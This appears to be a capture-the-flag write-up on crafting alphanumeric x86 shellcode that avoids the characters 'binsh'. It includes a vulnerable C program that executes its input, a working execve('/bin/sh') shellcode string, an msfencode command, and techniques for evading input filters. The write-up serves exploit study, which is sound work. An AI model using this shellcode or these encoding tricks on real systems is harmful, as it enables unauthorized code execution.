## Problem
Input: a string with following restrictions
Alphabets and Numbers only, which means: [0-9], [a-z], and [A-Z]
No "binsh/BINSH" characters
This string will be executed as machine code on the target server, which we call shellcode. So, we can guess that the program looks like this:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
int main()
{
    char alpha_bin[4096];
    char invalid[]="BINSHbinsh";
    int i;
 
    scanf("%s", alpha_bin);
 
    for(i = 0; i < strlen(invalid); i++) {
        if(strchr(alpha_bin, invalid[i]) != NULL) {
            puts("invalid input");
            exit(0);
        }
    }
 
    (*(void  (*)()) alpha_bin)();
 
    return 0;
}
```

## Workable Shellcode
First, let's ignore the restrictions first. We may need a test code to execute "bin/sh" successfully for further steps. And here's is it:
```

 80484b5:       cd 80                   int    $0x80
        ...
 
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
int main()
{
    char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
 
    (*(void  (*)()) shellcode)();
 
    return 0;
}
```

Also, by referring to the system call document, what we learn that the registers should be set before calling "INT 0x80":

- EAX: 0x0b
- EBX: Address of "bin/sh" string
- ECX, EDX: 0x00 (optional)

## Try: msfencode
```
cat shellcode.txt | msfencode BufferRegister=ECX -i sc.bin -e x86/alpha_mixed -t python -b 'binshBINSH'
```
This piece of code should give out our solution. However, the encoder returns error saying that it can't find the solution.

## Write It on My Own
Since the existing encoder can't solve this problem, we now have to solve it on our own. The things we know so far:
- Shellcode is saved on the stack with size 4096.
- Acceptable instructions are listed here

### Issue 1: Storing Arbitrary Value on Stack
- PUSH a small random value into the stack
- POP to ECX
- DEC ECX to the wanted value
- PUSH ECX

For larger wanted value:
- PUSH a small random value into the stack
- POP to EAX
- XOR EAX, <value> (this may need to be done twice to gain the wanted value)
- PUSH EAX

Notice:
- the value for XOR should be calculated manually
- pick ECX for DEC/POP/PUSH instructions under our initial restrictions
- pick EAX for XOR (0x35 opcode)

### Issue 2: Storing Instructions on Stack
There are some instructions not accepted in our input shellcode, so we somehow generate the instructions as data and push them onto the stack. By having "-fno-stack-protector -z execstack" option while compiling in GCC, we can execute the pushed instructions later.

### Issue 3: Move EIP to Stack
- EIP is in the stack and pointing to the current shellcode
- ESP is where our instructions ("POP EBX", "INT 0x80") is pushed on
It will be easy if we call a jump instruction to move the EIP to ESP, then our instructions will be executed. However, we only have o8 (8-bit immediately) jump instructions, which is not long enough to jump to ESP.
Therefore, I popped the stack in order to increase ESP in the begin of the shellcode.
- POP ESP for many times: increase ESP value
- make ESP locates after (and close to) the end of our shellcode
- call a small 8-bit jump to our stack (where "POP EBX", "INT 0x80" locate)
